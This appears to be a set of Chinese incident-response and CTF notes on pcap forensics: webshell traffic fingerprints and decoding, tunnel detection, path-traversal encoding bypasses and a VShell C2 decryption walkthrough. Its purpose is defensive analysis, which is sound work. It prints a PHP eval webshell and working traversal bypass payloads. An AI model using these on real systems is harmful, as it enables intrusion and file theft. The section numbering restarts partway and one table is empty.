# 应急：流量分析与隧道 / 外传

> 触发：应急题给 `.pcap` / `.pcapng`，问"攻击者干了什么 / 数据怎么出去的"。
> 本机跑法：WSL `ghost` 里有 `tshark`（4.6.4），图形化用 Windows 侧 Wireshark。

---

## 一、四步走：先俯瞰，再定位，再还原，再收口

```bash
# ① 协议分层总览：一眼看出有没有异常协议 / 异常占比
tshark -r x.pcap -q -z io,phs

# ② 会话排行：外连最多的 IP 就是重点
tshark -r x.pcap -q -z conv,tcp
tshark -r x.pcap -q -z conv,ip

# ③ 时间轴（判断攻击窗口，按 60 秒聚合）
tshark -r x.pcap -q -z io,stat,60

# ④ 导出对象：webshell、下载的马、被外传的文件都在这
tshark -r x.pcap --export-objects http,./out
tshark -r x.pcap --export-objects smb,./out_smb
```

追单条流：`tshark -r x.pcap -q -z follow,tcp,ascii,<流号>`，或 Wireshark 里右键 Follow → TCP Stream。

## 二、Webshell 管理流量：按工具认凶手

认出工具 = 找到 key 的位置 = 能解出攻击者的**完整命令历史**（flag 常在下过的命令回显里）。

| 工具 | 特征 |
|---|---|
| **中国菜刀** | 请求体以明文 `z0=` 开头 base64（解码后见 `@ini_set("display_errors","0")`） |
| **蚁剑 AntSword** | 请求体含 `ini_set("display_errors","0")`；响应 base64 前后各随机 2 字符；`@ini_set` 出现在请求体 |
| **冰蝎 Behinder** | **全程 AES**；Accept 头固定为 `text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2`；UA 为十六连随机；2.0 首包 GET 协商 key，**3.0 key = md5(密码)[:16]** |
| **哥斯拉 Godzilla** | Cookie 值以 `;` 结尾；`pass` / `key` 由 md5 派生；响应体加密 |
| **Shiro 反序列化** | `rememberMe` Cookie 是长 base64；请求体 AES-CBC + 固定头 |

解法：认出工具 → 找 key（首个请求 / 马源码里）→ 用蓝队分析研判工具箱一键解（支持冰蝎 / 哥斯拉 / Shiro / Log4j2）→ 还原每条命令。

> 无工具时手解冰蝎 3.0：`md5(password)[:16]` 作 AES key，CBC 模式，IV 在密文最前 16 字节。

### ⚠ 先过"hex 关"（真实实测踩到的坑）

**`tshark -T fields -e http.file_data` 默认输出是 HEX，不是文本。**技能上表说的"明文 `z0=`"
指的是**解码后的形态**；直接看屏幕会是一串 `7a303d...`，此时别以为不是菜刀。

```bash
# 正确链路：hex → 文本 → 取 base64 → 解码
HEX=$(tshark -r x.pcap -Y "http.request" -T fields -e http.file_data | head -1)
echo $HEX | xxd -r -p              # 得到 z0=QGluaV9zZXQo...
echo $HEX | xxd -r -p | sed 's/^z0=//' | base64 -d
# 输出：@ini_set("display_errors","0");@set_time_limit(0);echo "uid=0(root)...";
```

识别速查：`7a303d` = `z0=`（菜刀）；`40 69 6e 69 5f 73 65 74` = `@ini_set`（蚁剑/菜刀通用特征）。

### ★ 五大家族参数级特征表（答题卡按这四列对，比只看 UA 准）

| 家族 | 请求特征 | 响应特征 | 参数 / 编码 |
|---|---|---|---|
| **菜刀 China Chopper** | `POST /*.php`，`application/x-www-form-urlencoded` | 明文命令回显 | `pass=xxx&z0=...&z1=whoami` —— **明文，`strings` 即得** |
| **冰蝎 Behinder** | UA `Java/1.8.0_202`、`application/octet-stream` | 固定 16 字节头 + AES 密文 | `rebeyond=<Base64(AES)>&v=4&rid=xxx`；默认 key = `md5("rebeyond")[:16]` |
| **蚁剑 AntSword** | UA `antSword/v2.1 ...` | `AS####BEGIN` / `END` 分隔符 | `ant=<Base64>&_cmd=<b64>`；**参数名 = `substr(前2位随机字符) + base64`**；签名 `\|\|\|asline\|\|\|`、`antsystem` |
| **哥斯拉 Godzilla** | UA `...GodzillaClient/4.0`，常伪造 XFF | `##GODZILLA_RESPONSE_BEGIN/END##` | `pass=<b64 功能\|payload\|key>&mode=1&charset=UTF-8` |
| **自定义 / 换皮** | 伪装业务路径（如 `/upload/cache/img.php`），带 `X-Requested-With` + token | 自定义标记（如 `CUSTOM_WS_BEGIN/END`） | `token=<32hex>&data=<b64>&v=2&fmt=raw` |

**通用打法**：① `strings pcap | grep -iE "flag|pass|key"` 快速命中明文家族；② 统计 `POST /*.php` 次数与 body 参数名；③ **区分真实攻击源与伪造**：XFF 可伪造，**必须看 TCP 五元组**；④ 答题页格式严格（如 `Cache-Control: no-cache` 要带值；有的答案不要带 `##` 包裹）。

### ★★ 从 webshell 流量还原「有序命令序列」（高频答题卡，2026-10 补）

> 题型：**"攻击者使用的虚拟终端执行的前 3 条命令（逗号分隔）"**、"拿到 shell 后执行的前 3 条命令"。
> 实证出处：2025 京津冀大学生信息安全网络攻防大赛决赛应急响应 第 08 / 第 12 题（同一份 WP 连考两次）。
> 这类题**考的不是解密，是抽序** —— 会解密却答错，几乎全栽在下面三个坑上。

**第 0 步：先剥掉工具自己发的"非人工命令"（最大的坑）**

webshell 连接工具的虚拟终端**不是只发你敲的命令**：它每次进入目录 / 开终端都会自动补一条 `cd`，
而**判分平台按"人工输入"计数** —— 你若把 `cd` 也算进去，序列整体错位，全题丢分。

> 实测口径（2025 京津冀 WP 原文）：第 08 题 `2.php` 的第 1 条就是工具自动发的
> `cd "D:/phpstudy_pro/WWW/1";`（带引号、带分号），第 2 条才是人工的 `ifconfig`
> ⇒ **正确答案 `ifconfig,whoami,uname -a` 里的三条全是人工命令，`cd` 不计数。**

判据：`cd "..."` / `cd /var/www/...` **带引号且带尾分号**、路径正好是马所在目录 ⇒ 工具自动发的，剔除。

**第 1 步：找命令参数（蚁剑是「随机名参数」+ URL 编码 + base64）**

```
POST /2.php                        参数名不是固定的 ant/_cmd，每个马都不一样
                                    形如 <2位随机前缀><base64> = "A3B4..."（前缀长度随工具版本/配置变）
```

**别把 `ant` / `_cmd` 当固定名去 grep**（那是本文件上表的示例形态，不是恒定字段名）。
正确做法：**把这台马的 POST 请求参数名全集列出来，看哪个是随机串**——

```bash
P=x.pcap
# ① 列该马的全部 POST 请求：参数名 + UA（UA 里通常直接写着 antSword/v2.x）
tshark -r $P -Y 'http.request.method=="POST" && http.request.uri contains "2.php"' \
  -T fields -e frame.number -e http.user_agent -e http.file_data -E separator='|'
# ② 定位参数名：取出 body 里 "= " 前面的那段
tshark -r $P -Y 'http.request.method=="POST" && http.request.uri contains "2.php"' \
  -T fields -e http.file_data | head -5 | xxd -r -p | grep -oE '^[A-Za-z0-9_]+=' | sort -u
# ③ 该参数值是两次编码：URL 解码 → 再 base64 解码 → 得到明文命令
```

**解码链（照抄）**：`URLdecode(参数值)` → `base64 -d` → 明文命令。
**先 URL 解码再 base64**，顺序反了会 `base64: invalid input`。

**第 2 步：按流顺序排，正确性靠"响应有没有输出"锚定**

```bash
# 按 frame 号升序（= 时间顺序）导出每一条命令
tshark -r $P -Y 'http.request.uri contains "2.php"' -T fields -e frame.number -e http.file_data \
  | while IFS=$'\t' read -r n hex; do
      echo "$hex" | xxd -r -p \
        | sed -n 's/^[A-Za-z0-9_]*=//p' \
        | python3 -c "import sys,urllib.parse,base64;print(base64.b64decode(urllib.parse.unquote(sys.stdin.read().strip())).decode('utf-8','replace'))"
    done
```

判读要点：
- 响应体侧是 **base64 + 前后各若干随机字符**（蚁剑特征）⇒ 解前先剥掉随机头尾，再 base64
- **命令有输出**（`ifconfig` / `whoami` / `uname -a` / `ls`）⇒ 这些是**枚举类命令**，几乎必有、连考两次
- **文件操作类**只记命令本身，别把回显一并抄进去

**第 3 步：剔除工具包装**

`cd "路径";`（见第 0 步）、末尾 `;`、外层引号 —— 都是包装，**不写进答案**。

**第 4 步：交之前必须做的一次对拍**

1. 按 frame 号（时间）列出**全部**请求，不要只取前几条就去答
2. 记录每条的命令 + 有无输出
3. 逐字读题面里的**格式要求**（"逗号分隔"/"前 3 条"/"含等号"/"完全匹配"）—— 见 `应急响应总纲.md` §答案格式纪律
4. 命令多的题（常见 7 条）⇒ 答题卡通常按序号逐格填，**一格一条，不要合并**

> **同类题的通法**：只要题面出现「执行过的命令 / 命令序列 / 攻击者下了什么命令」，
> 入口就两个 —— **webshell 参数解码**（本节）或 **GoTTY 网页终端 WS 帧**（`系统指纹速查卡.md §1`）。
> 先判入口属于哪一种，再套对应的解码链，别在错的入口上解半天。

---

**★ 蚁剑自定义 RSA 编码器 = 公钥可解（核心发现）**：自定义编码器常是「**私钥加密 → 服务端 `openssl_public_decrypt`**」的错用模型
⇒ 拿到 webshell 里嵌的**公钥**即可 `m = c^e mod n` 剥掉 PKCS#1 填充，**不需要私钥就能全量解密**。
> 配套：马通常被打成 ZipCrypto 加密包 —— **已知明文 CRC 时可爆破短密码**（纯 Python 数分钟）。

**★ 答题卡 md5 的算法口径**：`md5('flag{a-b-c}')` —— 对**带 `flag{}` 包裹的整串**算，不是只对内容算。示例串可本地验证，**提交前先本地算一遍对拍**。

> 同理，`-e http.file_data` / `-e data.data` 出的都是 hex；要么用 `-T fields` 配合 `xxd -r -p`，
> 要么直接 `--export-objects` 导出成文件（文件里就是原始二进制，可 `strings` 或直接读）。

### ★ 写出「攻击者上传的 webshell 内容」题的判分口径（易丢分，2026-10 补）

> 题型：**"攻击者写入第一个 webshell 的内容（请提取请求内容并做相关解码操作，将进行完全匹配）"**
> 实证出处：2025 京津冀决赛应急响应 第 05 题。

**三层要剥清，剥多剥少都判错：**

| 层 | 内容 | 处置 |
|---|---|---|
| **① 传输编码** | 请求体里是 **URL 编码**，形如 `echo%20%27%3C%3Fphp...%27%20%3E%201.php` | **要解码**（题干通常明说"进行相关解码操作"） |
| **② shell 包装** | 真正的写文件动作是 `echo '<木马正文>' > 1.php` | **要剥掉** `echo` / 引号 / `>` 文件名 —— 这些是投递方式，不是木马内容 |
| **③ 木马正文** | `<?php foreach($_POST as $a){ $code = $a; } eval($code); ?>` | **这才是答案** |

**处理链（照抄）**
```bash
# 先锁"写文件"那一条请求（题面常给文件名，如 1.php）
tshark -r $P -Y 'http contains "1.php" && http.request.method=="POST"' \
  -T fields -e frame.number -e http.file_data | head
# hex → 文本 → URL 解码
... | xxd -r -p | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))"
# 得到：echo '<?php foreach($_POST as $a){ $code = $a; } eval($code); ?>' > 1.php
#       ↑ 剥掉 echo ' 与 ' > 1.php，答案就是中间的木马正文
```

**判分口径（WP 实证）**：答案是**木马正文本身**，不是整条 shell 命令。
即使没有外层 `echo`（比如文件上传形态），答案也只取**上传文件的内容**。

**批量取证：先看总共传了几个马**
```bash
tshark -r $P -Y 'http.request.method=="POST"' -T fields -e http.request.uri | sort | uniq -c | sort -rn | head
```
> 实测该题传了 `1.php` 与 `2.php` **两个**马：题面问"**第一个**"，
> 所以要按 **frame 号最小**的那个来答，别看错成第二个（两个都在流量里，选错整题不得分）。

**提交前自检**：把答案贴回原请求，**去掉传输编码后能否与"剥完包装的正文"逐字节对上** —— 对不上就是剥多或剥少了。

## 三、隧道检测（流量小，最容易被漏）

隧道的特点是**流量不大但有规律**，只看会话排行会漏。要按特征找。

### DNS 隧道

```bash
# 抽所有 DNS 查询名，看长度与频率
tshark -r x.pcap -Y "dns.flags.response==0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -30
```

判据：**超长子域（>40 字符）+ 高熵随机串 + 同一父域下海量不同子域**。答题卡常问**隧道域名**与带出去的目录名 / 文件名。

### ⚠ pcapng 解析三个坑（实测，会导致"丢包 / 看不出内容"）

| 坑 | 现象 | 处理 |
|---|---|---|
| **TSO 包 `IP total length = 0`** | 大量包被解析器丢弃、看到的流量比实际少 | 用**实际长度兜底**（读捕获长度而非头里的长度字段）；纯手写解析时优先判 `total_length == 0` |
| **`linktype=228`** | 链路层没有以太网头，按以太网解析就全错 | 纯 IPv4 链路，直接从 IP 头开始解析 |
| **`linktype=220 usbmon`** | USB 流量题 | 头 64B（usbmon 头）+ 8B（HID 报文），**只用 `submit` 报文**（type 0x43），丢弃 complete 报文 |
| **`-e http.file_data` 输出是 hex** | 肉眼看不出 webshell | `xxd -r -p` 还原成文本（见上文「hex 关」） |

> 检测侧建议（答题卡常问"怎么检测"）：ICMP / DNS 隧道看**长度方差与子域熵**；USB 取证用 HID 解码；WebShell 用**固定头 / 固定长度 / 固定分隔符**特征匹配。


### ICMP 隧道

```bash
tshark -r x.pcap -Y "icmp" -T fields -e ip.src -e ip.dst -e data.len | sort | uniq -c | sort -rn | head
```

判据：ICMP 包 **payload 明显偏大**（正常 ping 32/64 字节）或带连续 data 字段。

### HTTP(S) 心跳 / C2

判据：**固定间隔**（如每 60 秒）、固定长度、对同一目标的反复小请求 = beacon。

```bash
# 看某 IP 的请求间隔与 URI 规律
tshark -r x.pcap -Y "ip.addr==1.2.3.4 && http.request" -T fields -e frame.time -e http.request.uri | head -30
```

|---|---|

```bash
# 只看上行最大的会话
tshark -r x.pcap -q -z conv,tcp | sort -k5 -rn | head -15
```

## 五、从流量还原攻击链

顺序：**入口 → 命令执行 → 提权 / 横向 → 外传**。

```bash
# 入口：谁在打 web（高频 POST / 异常 UA / 明显 payload）
tshark -r x.pcap -Y "http.request" -T fields -e ip.src -e http.request.method -e http.request.full_uri | sort | uniq -c | sort -rn | head -30
# 请求体（明文 webshell 或外传内容）
tshark -r x.pcap -Y "http.request.method==POST" -T fields -e ip.src -e http.file_data | head -20
# 横向：内网新出现的连接
tshark -r x.pcap -Y "ip.dst==10.0.0.0/8" -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn | head
```


## 假点

- 只按流量大小排行 → **隧道和 C2 流量小**，要靠"规律性 + 子域长度 + 固定间隔"找
- 只看请求不看响应 → flag 常在**命令回显（响应体）**里
- 忘了 `--export-objects` → 落地的马、被传出的文件能直接导出，比手工翻流快十倍
- 冰蝎解不开就放弃 → 先找密码（马源码 / 首个请求），3.0 的 key 是 `md5(密码)[:16]`
- 把 CDN / 跳板 IP 当攻击者 IP 交 → 要看应用层真实源
- 时间不换算 → 日志 / 抓包一律标注时区（UTC 与本地差 8 小时）

## 一、四步一眼定位（30 秒判型）

```
① 有没有 /download、/file、/read、/export 这类「传文件名」的端点？
      ↓ 有
② 同一端点、同一目标，是否有「写法不同 → 400/403 → 200」的差分？
      ↓ 有 → 这就是路径穿越题，且必然有一层编码绕过（否则不会有 400）
③ payload 里的 %XX 是高字节（≥0x80）还是 %25 / %2e 这类 ASCII 重编码？
      ↓ 高字节  → 「多字节字符集 / Unicode 截断」类，不是多重 URL 编码类
      ↓ %25     → 「多次 URL 编码」类
      ↓ %2e%2e%2f → 单层 URL 编码，说明过滤器根本没解码（最低级）
④ percent-decode 成字节后，用「严格 UTF-8」解：
      能解出合法码点 且 码点 > 0xFF  → ★「低位截断」类（本文样本）
      能解出合法码点 但 码点 < 0x80  → 「overlong UTF-8」类（依赖宽松解码器）
      解不出（出现 U+FFFD / 报错）    → 需要宽松/非严格解码器，或 GBK/Big5 等宽字符集
```

**一句话判据**：**过滤器和「真正去开文件的那一层」看的不是同一个表示** —— 前者看字符串/Unicode，后者看字节。凡是这种「一个值两套编码规则」，都必然能构造出「检查通过、使用时还原成 `../`」的 payload。

## 二、变体 → 解码层数 / 生效条件对照表（可直接抄进答题卡）

| 变体（URL 里写什么） | 字节层还原成 | 解码层数 | 生效前提（哪个环节幼稚才会中） |
|---|---|---|---|
| `..%2f` / `%2e%2e%2f` | `../` | **1 层 percent-decode** | 过滤器在 **percent-decode 之前**就查（即根本没解码） |
| `%252e%252e%252f` | `../` | **2 层 percent-decode** | 过滤器只解 1 层；或过滤器查原始串、后端解 2 次 |
| `..%5c` / `..\` | `..\` | 1 层 | Windows 后端（反斜杠也是分隔符）；过滤器只查了 `/` |
| `....//` / `....\/` | `../`（经「删除 `../`」后残留） | 0 层（纯字符串） | 过滤器是 **`str_replace("../","")` 再检查** 才有效 ⚠ 若过滤器是 `contains("../")`，`....//` **仍含 `../` 子串，会被拦**（本文样本实测 400） |
| `..%00/` / `..%2500/` | `../`（截断） | 1~2 层 | 老式 C 风格字符串 / 老中间件（`%00` 截断） |
| `%c0%ae%c0%af` | `../` | 1 层 + **宽松 UTF-8 解码** | **overlong UTF-8**：`0xC0 0xAE` 本是 `.` 的非法 2 字节编码；严格解码器（现代 Python/Java/浏览器）会报错或给 U+FFFD，只有宽松解码器才吐出 `.` |
| **`%c4%ae%c4%af`（本文样本）** | **`../`** | **1 层 + 严格 UTF-8 + 低 8 位截断** | **严格合法 UTF-8**：`C4 AE` = U+012E(Į)、`C4 AF` = U+012F(į)；只要后续有 `(char)` 强制转换 / `codepoint & 0xFF` / `DataOutputStream.writeBytes(String)`，低位就还原成 `0x2E`/`0x2F` |
| `%ef%bc%8e%ef%bc%8f` | `．．／` → `../` | 1 层 + **Unicode 规范化(NFKC/NFKD)** | 后端做了形近规范化（全角→半角）；过滤器没做 |
| `%u002e%u002f` | `../` | 1 层 **`%u` 解码**（IIS 特有） | IIS / 支持 `%uXXXX` 的自研解码器 |
| `%c4%ae%5c` | GBK 双字节吃掉 `\` | 1 层 + GBK 解码 | **宽字节**：`C4 AE` 在 GBK 里是一个汉字，紧跟的 `%5c`(=`\`) 被并入，导致转义失效（经典 SQL 宽字节注入同源） |
| `%25c4%25ae` | → U+012E → `.` | 2 层 percent + 截断 | 双层编码 + 低位截断叠加 |

**记忆锚点**：这份表里**只有 `%c4%ae`（严格合法 UTF-8 + 低位截断）不需要任何"宽松解码器"**，它在最严的 UTF-8 解码器下也能过——这正是它比 `%c0%af` 更"干净"的地方，也是它出现在新题里的原因。

## 三、本样本的完整机制（可作模板讲解）

**服务端代码（反编译原文）**
```java
if (file.contains("../") || file.contains("..\\"))         // ← 过滤器：只看 String 里的明文 ../
    return ResponseEntity.badRequest().body("非法的文件路径");
Path directPath = Paths.get(DOC_DIR, file).normalize();
if (Files.exists(directPath, ...) && Files.isRegularFile(directPath, ...))
    return serveFile(directPath);
ByteArrayOutputStream baos = new ByteArrayOutputStream();
DataOutputStream dos = new DataOutputStream(baos);
dos.writeBytes(file);                                      // ← ★ 每个 char 丢弃高 8 位写成 1 字节
String actual = baos.toString();
Path ghostPath = Paths.get(DOC_DIR, actual).normalize();    // ← 幽灵路径：此时 "../" 已在字节层还原
if (Files.exists(ghostPath, ...) && Files.isRegularFile(ghostPath, ...))
    return serveFile(ghostPath);
```

**三层解码（答题卡就按这三行写）**
```
L1 percent-decode : %C4%AE%C4%AE%C4%AF  ->  b'\xc4\xae\xc4\xae\xc4\xaf'   (字节)
L2 UTF-8 解码     : b'\xc4\xae\xc4\xae\xc4\xaf'  ->  'ĮĮį'                (字符串，不含 '../'，过滤器放行)
L3 低位截断       : 'ĮĮį'  ->  0x2E 0x2E 0x2F  ->  '../'                  (字节，文件系统命中)
```

**通用识别口诀**：`%C0~%EF` 打头的高字节 → 先解 UTF-8 拿码点 → **看码点低 8 位是不是你要的 ASCII**（`.`=0x2E、`/`=0x2F、`\`=0x5C）。是 ⇒ 低位截断类。

**速算**：想表达 ASCII 字符 `X`，就发 `%C4%X+0x80`…… 更准确说：找到码点 `0x100 + X` 的 UTF-8 编码即可。
- `.`(0x2E) → U+012E → `%C4%AE`
- `/`(0x2F) → U+012F → `%C4%AF`
- `\`(0x5C) → U+015C → `%C5%9C`（同族可推）

## 四、响应侧的 5 个快速判据（不用读源码就能定性）

1. **`Content-Disposition` 会泄底**：很多实现把「穿越到的文件名 basename」回写进 `attachment; filename="passwd"` —— **只看响应头就知道读走了哪些文件**，比重放快十倍。
   `tshark -r x.pcapng -Y http.response -T fields -e http.response.line | tr ',' '\n' | grep -i disposition`
2. **400 → 200 的差分就是「绕过了什么」的答案**：把同一目标用不同写法各发一次（明文 `../`、`....//`、编码形），响应码的跳变直接标出过滤器的实现层级。
3. **错误码本身的语义**：`400 + 自定义文案`（如「非法的文件路径」）= 应用层过滤器命中；`404 + 无 body` = 过滤器过了但文件不存在；`500` = 校验过了、**打开环节炸了**（多为伪文件系统 `/proc/*`、权限、资源写出失败）—— 500 恰恰说明**校验已被绕过**，是有价值的信号，别当成"没打通"。
4. **`Server` 头缺失 + `Whitelabel Error Page`** ≈ Spring Boot；`Content-Type: application/octet-stream;charset=UTF-8` 是 Spring 返回裸字节的典型形态。
5. **中文文件名乱码**（`filename="������API..."`）= 源码里做了 `getBytes("UTF-8")` + `new String(..., "ISO-8859-1")`，是 Java 后端的旁证。

## 五、工具速查（WSL tshark 口径）

```bash
P=x.pcapng
# ① 俯瞰：谁在打 web
tshark -r $P -q -z conv,ip ; tshark -r $P -q -z io,phs
# ② 抽请求全集 + 去重
tshark -r $P -Y http.request -T fields -e frame.number -e frame.time -e ip.src -e http.request.method \
       -e http.host -e http.request.uri -e http.user_agent -E separator='|' > req.txt
# ③ 锁穿越特征（含高字节编码形）
grep -E '%2e|%25|%5c|%c0|%c4|\.\.|\.\.%2f|%C4%AE' req.txt
# ④ 对响应对状态码
tshark -r $P -Y 'http.response' -T fields -e frame.number -e http.response.code -e http.content_length \
       -e http.content_type -e http.request.uri -E separator='|'
# ⑤ 导对象（比手工翻流快十倍）
tshark -r $P --export-objects http,./objects -q
# ⑥ hex 关：-e http.file_data 出的是 hex
tshark -r $P -Y 'frame.number==636' -T fields -e http.file_data | xxd -r -p
# ⑦ 明文 flag 短路（zip 里 store 模式的内层文件会是明文）
strings -n 5 $P | grep -iE 'flag\{|ZmxhZ'      # ZmxhZ = 'ZmxhZ' = base64("flag")
```

**★ 关键提醒**：`flag{` 被 base64 或压缩藏住时，**不要只 grep `flag{`**：
- 先 `strings | grep ZmxhZ`（base64 编码的 `flag` 前缀）
- 再 `--export-objects` 全导出，对小文件逐个 `strings | grep -i flag`
- 最后 `unzip` + `base64 -d` 分层解；**`method=store`（未压缩）的 zip 成员在流量里是裸明文**

## 六、假点（这一类的坑）

- **把 `....//` 当成"一定能过"**：它只在「`str_replace('../','')` 再判断」的过滤器上有效；若过滤器是 `contains("../")`，`....//` 的第 3~5 字符正好是 `.`/`.`/`/`，**构成子串会被拦**（本文样本实测 400）。
- **只 grep `../`**：encoded payload 在流量里**根本不含 `../`**，用 `grep '\.\./'` 会漏掉整条链。必须同时查 `%2e %25 %c0 %c4 %ef %u00` 等。
- **把 500 当"没打通"**：500 往往是**校验已绕过、打开环节失败**（如 `/proc/*`、权限、写出异常），是绕过成功的旁证。
- **只看流量大小排行**：本题 21 MB 的 `app.jar` 下行是"显眼"的，但真正定性的证据是 92 帧的 HTTP 小请求（400/200 差分）。小流量里才有洞。
- **忘了服务端也回吐文件名**：`Content-Disposition` 直接给出被读文件清单，忽略它就得靠人工枚举。
- **跳过去反编译**：本次流量里下载了 `app.jar`，**直接反编译就拿到了过滤器与截断分支的原文**——从"推测绕过原理"变成"引用源码"。**流量里出现 jar/源码/备份包时，先把它们拆开看**。
- **flag 形态不核对**：本题 base64 解出的是 `flag{...}}`（多一个 `}`）。**解码后必须数括号、看长度**，并在答案里同时给"原样形"与"规范形"。

## 八、VShell C2（Go 系 C2，2026 最新技术栈）

> 来源：2026-05 Solar 应急月赛官方题解（143K 全文）。**这是目前应急题里加密最复杂的一类**，但判据链完整、可照着走。
> **为什么值得单列**：它不是"认出工具就能解"（虽然第一步是认工具），而是**一条完整的"从流量 → 提取 stager → 逆向植入体 → 推导密钥 → 解密配置"链**。

### 8.1 指纹识别（30 秒）

```
WebSocket 升级请求：GET /?a=l64&h=<C2_IP>&t=ws_&p=8443
      a=l64    → "我是 Linux 64 位"（VShell 固定标识）
      h=<IP>   → C2 地址明文写在 URI 里
      t=ws_    → WebSocket 模式
      User-Agent: Go-http-client/2.0   → Go 写的客户端
TCP 8084 首包前 6 字节 = "l64   "（注意后面三个空格补位）
```

**★ 提速法**：**搜 `"l64 websocket C2"` 直接命中 VShell** —— 不用自己分析。
（这就是 `应急与取证通用判据.md` §五 的"不认识 token 直接搜"）

### 8.2 特征总表（已知工具 ⟹ 加密参数已知）

| 特征 | 值 |
|---|---|
| 语言/模式 | Go；支持 TCP / WebSocket / DNS / DoH 四种 |
| C2 流量加密 | **AES-256-GCM** |
| C2 帧格式 | `[4字节长度LE][12字节nonce][密文][16字节GCM tag]` |
| 密钥派生 | `MD5(salt).hexdigest().encode()`（**注意是 hexdigest，见 §8.6 陷阱**） |
| Stager 加密 | **XOR 0x99** |
| 内置配置 | AES-128-CBC，**IV 取 Key 本身** |

### 8.3 Stager 提取与解密（**密钥不用猜**）

```python
import struct
with open("stager_raw.bin", "rb") as f:
    data = f.read()
payload_len = struct.unpack("<I", data[:4])[0]      # 前 4 字节小端 = 长度
body = data[4:4 + payload_len]
elf = bytes(b ^ 0x99 for b in body)
assert elf[:4] == b"\x7fELF", "XOR 解密失败"
```

**★ 判据（关键）**：**ELF 头固定 `\x7fELF` ⇒ 密文首字节 ^ 0x7f = 0x99** ⇒ **密钥一步反推，不需要猜**。
这是 `应急与取证通用判据.md` §一「密文首字节 ^ 明文首字节 = 密钥」的实战应用。

**Wireshark 取 stager 的操作**：`Follow → TCP Stream` → 方向选 **C2→victim** → `Show and save data as` **Raw**。

### 8.4 Go ELF 逆向要点

```
strings 见 crypto/aes / crypto/md5 / crypto/cipher / *main.VShellConfig / runtime.main
  ⇒ 确定是 Go implant
```
**Go stripped 也有规律**：搜 `VShellConfig` 交叉引用 → 从 `runtime.main` 顺调用链 → 定位 `crypto/md5` 与 `crypto/aes` 的引用点。

**★ 5 层反调试（全在 `init()`，`main()` 还没跑就检查）**：

| 层 | 手段 | 判据 |
|---|---|---|
| 1 | 读 `/proc/self/status` 的 `TracerPid` | 非 0 ⇒ `exit(0xDEAD)` |
| 2 | `ptrace(PTRACE_TRACEME)` | 已被 attach 返回 -1 |
| 3 | 读 `/proc/<ppid>/comm` | 匹配 `gdb`/`strace`/`ltrace` |
| 4 | 测 `getpid()` 耗时 | 正常 <1μs；被单步执行飙到**几十 ms** |
| 5 | 扫 `/proc/self/maps` | 找 `gdb`/`ltrace`/`strace`/`frida`/`radare`/`libdebug`/`pin` |

**绕过两法**：
- ★ **纯静态分析**（推荐）—— 后续加密逻辑都是纯算法，不跑也能推
- NOP 掉 `exit(0xDEAD)` 调用

**注意**：敏感字符串全部 **XOR 0xAA** 编码 ⇒ 直接 `strings` 搜明文搜不到（要 XOR 回来再搜）。

### 8.5 ★ runtime seed（最难的一环 —— 因为**它不在流量里**）

```
runtime seed = MD5(ELF 文件前 4096 字节).hexdigest()[:8]
```
⇒ **种子来自二进制自身内容的哈希**（反取证的常见手法）。

**config key 派生链**：
```go
h1 := md5.Sum([]byte(machineID)); midPrefix := hex.EncodeToString(h1[:])[:8]  // MD5(machine-id) 前 8 hex
h2 := md5.Sum([]byte(hostname));  hnPrefix  := hex.EncodeToString(h2[:])[:8]  // MD5(hostname) 前 8 hex
seed := getRuntimeSeed()
material := midPrefix + hostname + hnPrefix + seed
h3 := md5.Sum([]byte(material))
return h3[:]   // 16 bytes → AES-128 key
```

**Python 复刻**：
```python
h1 = hashlib.md5(mid.encode()).hexdigest()[:8]   # "96990f4b"
h2 = hashlib.md5(hn.encode()).hexdigest()[:8]    # "46dd7a07"
material = h1 + hn + h2 + runtime_seed           # "96990f4bweb-prod-0146dd7a07ae85bd11"
config_key = hashlib.md5(material.encode()).digest()   # 16 bytes
```

**配置解密（AES-128-CBC，IV = Key）**：
```python
iv = config_key[:16]
cipher = AES.new(config_key, AES.MODE_CBC, iv=iv)
plaintext = unpad(cipher.decrypt(encrypted_config), AES.block_size)   # 128 字节密文
config = json.loads(plaintext)
# → {"server":"103.45.67.89","port":8443,"type":"reverse",
#    "vkey":"vk_prod_2024","salt":"Pr0duct10n_S4lt_2024_VSh3ll_X"}
```

**提取难点**：**从分片 + 垃圾数据里拼出完整的 128 字节加密配置**（见 `应急与取证通用判据.md` §六）。

### 8.6 ★★ C2 密钥陷阱（最容易卡死的地方）

```python
# ❌ 错：16 字节 → AES-128 → GCM MAC 永远校验失败，且报错看不出原因
# c2_key = hashlib.md5(salt.encode()).digest()

# ✅ 对：32 字节 ASCII hex 字符串 → AES-256-GCM
c2_key = hashlib.md5(salt.encode()).hexdigest().encode()
```

**通用教训（可迁移到任何加密题）**：
> **MAC/校验一直失败，90% 不是算法错，而是"长度/编码/密钥来源"三者之一错。**
> 排查顺序见 `应急与取证通用判据.md` §九。

### 8.7 这类题的通用流程（任何"未知 C2 加密流量"都能套）

```
① 认工具：抓指纹（URI 参数 / UA / 首包特征）→ 不认识就直接搜那个 token
② 找公开特征：认到工具 ⇒ 加密算法/帧格式/密钥派生方式 就都有了（省掉逆向）
③ 取 stager：Follow TCP Stream → 方向选"服务器→受害" → 存 Raw
④ 解 stager：长度前缀 + 固定密钥（用已知明文头反推 XOR 密钥）
⑤ 静态分析植入体：strings（注意 XOR 编码的串）→ 找配置结构体 → 找密钥派生函数
⑥ 复刻密钥派生：凡是"种子来自文件自身哈希"就试 MD5(前4096)/MD5(整体)
⑦ 解密配置：注意 IV 是否等于 Key
⑧ 拿到 server/port/key ⇒ 按题目问法组织答案
```
